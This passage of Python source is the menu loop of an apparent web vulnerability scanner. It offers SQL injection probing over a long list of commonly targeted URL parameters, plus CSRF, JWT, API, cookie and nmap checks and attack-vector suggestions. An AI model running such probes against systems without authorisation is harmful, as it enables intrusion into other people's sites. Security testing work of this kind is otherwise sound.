                print(f"{Fore.CYAN}\nTesting SQL Injection...{Style.RESET_ALL}")
                sqli_test_paths = [
                    "view_items.php?id=",
                    "home.php?cat=",
                    "item_book.php?CAT=",
                    "www/index.php?page=",
                    "schule/termine.php?view=",
                    "goods_detail.php?data=",
                    "storemanager/contents/item.php?page_code=",
                    "customer/board.htm?mode=",
                    "help/com_view.html?code=",
                    "n_replyboard.php?typeboard=",
                    "eng_board/view.php?T****=",
                    "prev_results.php?prodID=",
                    "bbs/view.php?no=",
                    "gnu/?doc=",
                    "zb/view.php?uid=",
                    "global/product/product.php?gubun=",
                    "m_view.php?ps_db=",
                    "productlist.php?tid=",
                    "product-list.php?id=",
                    "onlinesales/product.php?product_id=",
                    "garden_equipment/Fruit-Cage/product.php?pr=",
                    "product.php?shopprodid=",
                    "product_info.php?products_id=",
                    "showsub.php?id=",
                    "product.php?sku=",
                    "store/product.php?productid=",
                    "productList.php?cat=",
                    "product_detail.php?product_id=",
                    "more_details.php?id=",
                    "county-facts/diary/vcsgen.php?id=",
                    "idlechat/message.php?id=",
                    "podcast/item.php?pid=",
                    "details.php?prodId=",
                    "ourblog.php?categoryid=",
                    "mall/more.php?ProdID=",
                    "archive/get.php?message_id=",
                    "review/review_form.php?item_id=",
                    "english/publicproducts.php?groupid=",
                    "news_and_notices.php?news_id=",
                    "rounds-detail.php?id=",
                    "gig.php?id=",
                    "board/view.php?no=",
                    "index.php?modus=",
                    "news_item.php?id=",
                    "rss.php?cat=",
                    "products/product.php?id=",
                    "details.php?ProdID=",
                    "els_/product/product.php?id=",
                    "store/description.php?iddesc=",
                    "socsci/news_items/full_story.php?id=",
                    "naboard/memo.php?bd=",
                    "bookmark/mybook/bookmark.php?bookPageNo=",
                    "board/board.html?table=",
                    "kboard/kboard.php?board=",
                    "order.asp?lotid=",
                    "goboard/front/board_view.php?code=",
                    "bbs/bbsView.php?id=",
                    "boardView.php?bbs=",
                    "eng/rgboard/view.php?&bbs_id=",
                    "product/product.php?cate=",
                    "content.php?p=",
                    "page.php?module=",
                    "?pid=",
                    "bookpage.php?id=",
                    "cbmer/congres/page.php?LAN=",
                    "content.php?id=",
                    "news.php?ID=",
                    "photogallery.php?id=",
                    "index.php?id=",
                    "product/product.php?product_no=",
                    "nyheder.htm?show=",
                    "book.php?ID=",
                    "print.php?id=",
                    "detail.php?id=",
                    "book.php?id=",
                    "content.php?PID=",
                    "more_detail.php?id=",
                    "content.php?id=",
                    "view_items.php?id=",
                    "view_author.php?id=",
                    "main.php?id=",
                    "english/fonction/print.php?id=",
                    "magazines/adult_magazine_single_page.php?magid=",
                    "product_details.php?prodid=",
                    "magazines/adult_magazine_full_year.php?magid=",
                    "products/card.php?prodID=",
                    "catalog/product.php?cat_id=",
                    "e_board/modifyform.html?code=",
                    "community/calendar-event-fr.php?id=",
                    "products.php?p=",
                    "news.php?id=",
                    "StoreRedirect.php?ID=",
                    "subcategories.php?id=",
                    "tek9.php?",
                    "template.php?Action=Item&pid=",
                    "topic.php?ID=",
                    "tuangou.php?bookid=",
                    "type.php?iType=",
                    "updatebasket.php?bookid=",
                    "updates.php?ID=",
                    "view.php?cid=",
                    "view_cart.php?title=",
                    "view_detail.php?ID=",
                    "viewcart.php?CartId=",
                    "viewCart.php?userID="
                ]
                
                vulnerable_urls = test_sqli_on_paths(target_ip, sqli_test_paths)
                if vulnerable_urls:
                    print(f"{Fore.RED}Found SQLi vulnerabilities:{Style.RESET_ALL}")
                    for url in vulnerable_urls:
                        print(f" - {url}")
                else:
                    print(f"{Fore.GREEN}No SQLi vulnerabilities found{Style.RESET_ALL}")
            
            elif choice == "2":
                print(f"{Fore.CYAN}\nTesting CSRF...{Style.RESET_ALL}")
                csrf_tester = CSRFTester()
                if csrf_tester.detect_csrf_tokens(target_url):
                    print(f"{Fore.YELLOW}CSRF tokens detected{Style.RESET_ALL}")
                    csrf_tester.test_csrf_protection(target_url)
                    
                    if csrf_tester.vulnerable_endpoints:
                        print(f"{Fore.RED}CSRF vulnerabilities found:{Style.RESET_ALL}")
                        for vuln in csrf_tester.vulnerable_endpoints:
                            print(f" - {vuln['url']} ({vuln['method']})")
                    else:
                        print(f"{Fore.GREEN}No CSRF vulnerabilities found{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}No CSRF tokens detected{Style.RESET_ALL}")
            
            elif choice == "3":
                print(f"{Fore.CYAN}\nTesting JWT...{Style.RESET_ALL}")
                jwt_token = input("Enter JWT token to test (or press Enter to skip): ").strip()
                if jwt_token:
                    jwt_tester = JWTTester()
                    is_vulnerable, message = jwt_tester.test_jwt(jwt_token)
                    if is_vulnerable:
                        print(f"{Fore.RED}JWT vulnerability: {message}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.GREEN}{message}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}JWT test skipped.{Style.RESET_ALL}")
            
            elif choice == "4":
                print(f"{Fore.CYAN}\nTesting API Security...{Style.RESET_ALL}")
                api_tester = APITester(target_url)
                
                endpoint = input("Enter API endpoint to test for BOLA (e.g., users/): ").strip()
                if endpoint:
                    obj_id = input("Enter object ID to test: ").strip()
                    api_tester.test_broken_object_level_acl(endpoint, obj_id)
                
                api_endpoint = input("Enter API endpoint to test for data exposure (e.g., api/data): ").strip()
                if api_endpoint:
                    api_tester.test_excessive_data_exposure(api_endpoint)
                
                user_endpoint = input("Enter user API endpoint to test for mass assignment (e.g., api/users): ").strip()
                if user_endpoint:
                    api_tester.test_mass_assignment(user_endpoint)
                
                if api_tester.vulnerabilities:
                    print(f"{Fore.RED}API vulnerabilities found:{Style.RESET_ALL}")
                    for vuln in api_tester.vulnerabilities:
                        print(f" - {vuln['type']}: {vuln['description']}")
                else:
                    print(f"{Fore.GREEN}No API vulnerabilities found{Style.RESET_ALL}")
            
            elif choice == "5":
                print(f"{Fore.CYAN}\nAnalyzing Cookies...{Style.RESET_ALL}")
                cookie_analyzer = CookieAnalyzer()
                result = cookie_analyzer.analyze_cookies(target_url)
                
                if result.get('error'):
                    print(f"{Fore.RED}Error: {result['error']}{Style.RESET_ALL}")
                else:
                    if result['security_issues']:
                        print(f"{Fore.RED}Cookie security issues found:{Style.RESET_ALL}")
                        for issue in result['security_issues']:
                            print(f" - {issue['cookie_name']}: {', '.join(issue['issues'])}")
                    else:
                        print(f"{Fore.GREEN}No cookie security issues found{Style.RESET_ALL}")
            
            elif choice == "6":
                print(f"{Fore.CYAN}\nRunning Real-time Threat Analysis...{Style.RESET_ALL}")
                live_traffic = {
                    'src_ip': input("Enter source IP [192.168.1.105]: ") or "192.168.1.105",
                    'dst_ip': input("Enter dest IP [10.0.0.3]: ") or "10.0.0.3",
                    'bytes': int(input("Enter bytes [5842]: ") or 5842),
                    'is_malicious': 0
                }

                result = analyzer.analyze_network_traffic(live_traffic)
                if result:
                    print(f"\n{Fore.BLUE}Analysis Result:{Style.RESET_ALL}")
                    print(f"Threat: {Fore.RED if result['is_threat'] else Fore.GREEN}{result['is_threat']}{Style.RESET_ALL}")
                    print(f"Probability: {result['threat_probability']:.2f}")
                    print(f"Time: {result['timestamp']}")
                else:
                    print(f"{Fore.YELLOW}Analysis failed{Style.RESET_ALL}")
            
            elif choice == "7":
                print(f"{Fore.CYAN}\nSuggesting Attack Vectors...{Style.RESET_ALL}")
                suggestions = suggest_attacks(target_ip, services)
                print(f"{Fore.YELLOW}Suggested attacks:{Style.RESET_ALL}")
                print(suggestions)
            
            elif choice == "8":
                print(f"{Fore.CYAN}\nRunning Full Scan (All Tests)...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Running all security tests in sequence...{Style.RESET_ALL}")
                
                test_functions = [
                    ("SQL Injection", lambda: test_sqli_on_paths(target_ip, sqli_test_paths)),
                    ("CSRF", lambda: CSRFTester().test_csrf_protection(target_url)),
                    ("Cookie Analysis", lambda: CookieAnalyzer().analyze_cookies(target_url)),
                ]
                
                for test_name, test_func in test_functions:
                    print(f"{Fore.CYAN}Running {test_name} test...{Style.RESET_ALL}")
                    try:
                        result = test_func()
                        if result:
                            print(f"{Fore.GREEN}{test_name} test completed.{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.YELLOW}{test_name} test returned no results.{Style.RESET_ALL}")
                    except Exception as e:
                        print(f"{Fore.RED}{test_name} test failed: {e}{Style.RESET_ALL}")
            
            elif choice == "9":
                print(f"{Fore.CYAN}\nRescanning Ports...{Style.RESET_ALL}")
                open_ports_data = scan_with_nmap(target_ip, timeout=120)
                
                if open_ports_data:
                    open_ports = [str(item['port']) for item in open_ports_data]
                    services = [item['service'] for item in open_ports_data]
                    
                    print(f"{Fore.GREEN}Found {len(open_ports)} open ports: {', '.join(open_ports)}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}Services detected: {', '.join(set(services))}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}Rescan failed! Keeping previous port list.{Style.RESET_ALL}")
            
            elif choice == "10":
                print(f"{Fore.GREEN}Exiting...{Style.RESET_ALL}")
                break
            
            else:
                print(f"{Fore.RED}Invalid option! Please choose 1-10.{Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan cancelled by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        logging.exception("Scan failed")
